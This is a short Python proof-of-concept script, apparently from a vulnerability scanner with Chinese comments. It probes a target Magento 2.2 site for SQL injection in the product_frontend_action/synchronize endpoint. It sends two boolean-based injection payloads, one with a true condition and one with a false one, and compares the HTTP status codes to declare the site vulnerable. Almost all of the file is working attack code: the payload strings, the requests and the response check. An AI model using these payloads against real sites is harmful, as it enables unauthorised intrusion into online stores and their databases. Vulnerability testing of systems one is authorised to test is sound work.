import requests

class pocs:   
    def __init__(self):   #读取指定文件
        with open('../opt/前端传url.txt','r') as file:
            self.url = file.readline()

    def list_get(self):
        poc = {"number": "Magento 2.2","payload": ["/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-","/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-"]}    #两个payload互相印证
        code =[]
        for payload in poc['payload']:
            pay = self.url + payload
            response = requests.get(pay)
            code.append(response.status_code)
        if code[0] == 200 and code[-1] == 400:
            a = f"存在{poc['number']}漏洞"
            print(a)
            return a

pocs = pocs()
def mag():
    a = pocs.list_get()
    return a

